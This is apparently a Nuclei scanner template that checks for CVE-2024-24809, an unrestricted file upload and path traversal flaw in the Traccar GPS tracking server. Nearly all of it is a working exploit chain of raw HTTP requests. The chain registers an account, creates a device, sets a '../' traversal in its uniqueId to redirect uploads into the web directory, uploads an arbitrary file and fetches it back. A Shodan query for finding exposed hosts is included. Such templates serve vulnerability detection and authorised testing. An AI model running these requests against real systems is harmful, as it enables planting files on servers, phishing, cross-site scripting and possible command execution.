flow: http(1) && http(2) && http(3) && http(4) && http(5) && http(6) && http(7)
http:
- matchers:
  - condition: and
    internal: true
    part: body
    type: word
    words:
    - '"administrator":'
    - '"fixedEmail"'
  raw:
  - 'POST /api/users HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"name": "{{name}}", "email": "{{email}}", "password": "{{password}}", "totpKey":
    null}

    '
- matchers:
  - condition: and
    internal: true
    part: body
    type: word
    words:
    - '"deviceReadonly":'
    - '"expirationTime":'
  raw:
  - 'POST /api/session HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded;charset=UTF-8


    email={{email}}&password={{password}}

    '
- extractors:
  - internal: true
    json:
    - .id
    name: value
    part: body
    type: json
  matchers:
  - condition: and
    internal: true
    part: body
    type: word
    words:
    - '"calendarId"'
    - '"groupId":'
  raw:
  - 'POST /api/devices HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"name": "{{unique}}", "uniqueId": "{{unique}}"}

    '
- extractors:
  - internal: true
    name: filename
    part: body
    regex:
    - device\.([a-zA-Z]+)
    type: regex
  matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(content_type, "application/json")
    internal: true
    type: dsl
  raw:
  - 'POST /api/devices/{{value}}/image HTTP/1.1

    Host: {{Hostname}}

    Content-Type: image/srHtgGrc


    {{str}}

    '
- matchers:
  - condition: and
    internal: true
    part: body
    type: word
    words:
    - '"deviceImage":'
    - '"expirationTime":'
  raw:
  - 'PUT /api/devices/{{value}} HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"id": {{value}}, "attributes": {"deviceImage": "device.png"}, "groupId": 0, "calendarId":
    0, "name": "test", "uniqueId": "{{unique}}/../../../../../opt/traccar/modern",
    "status": "offline", "lastUpdate": null, "positionId": 0, "phone": null, "model":
    null, "contact": null, "category": null, "disabled": false, "expirationTime":
    null}

    '
- matchers:
  - condition: and
    dsl:
    - status_code == 200
    - contains(content_type, "application/json")
    internal: true
    type: dsl
  raw:
  - 'POST /api/devices/{{value}}/image HTTP/1.1

    Host: {{Hostname}}

    Content-Type: image/srHtgGrc


    {{str}}

    '
- matchers:
  - dsl:
    - status_code == 200
    type: dsl
  raw:
  - 'GET /{{filename}} HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2024-24809
info:
  author: DhiyaneshDK
  classification:
    cpe: cpe:2.3:a:traccar:traccar:*:*:*:*:*:*:*:*
    cve-id: CVE-2024-24809
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:L
    cvss-score: 8.5
    cwe-id: CWE-27
    epss-percentile: 0.09551
    epss-score: 0.00043
  description: 'Traccar is an open source GPS tracking system. Versions prior to 6.0
    are vulnerable to path traversal and unrestricted upload of file with dangerous
    type. Since the system allows registration by default, attackers can acquire ordinary
    user permissions by registering an account and exploit this vulnerability to upload
    files with the prefix `device.` under any folder. Attackers can use this vulnerability
    for phishing, cross-site scripting attacks, and potentially execute arbitrary
    commands on the server. Version 6.0 contains a patch for the issue.

    '
  metadata:
    max-request: 1
    product: traccar
    shodan-query: html:"Traccar"
    vendor: traccar
    verified: true
  name: Traccar - Unrestricted File Upload
  reference:
  - https://github.com/traccar/traccar/commit/b099b298f90074c825ba68ce73532933c7b9d901
  - https://github.com/traccar/traccar/security/advisories/GHSA-vhrw-72f6-gwp5
  - https://nvd.nist.gov/vuln/detail/CVE-2024-24809
  severity: high
  tags: cve,cve2024,traccar,rce,intrusive,file-upload
variables:
  email: '{{randstr}}@{{rand_base(5)}}.com'
  name: '{{rand_base(6)}}'
  password: '{{rand_base(8)}}'
  str: '{{randstr}}'
  unique: '{{rand_base(6)}}'
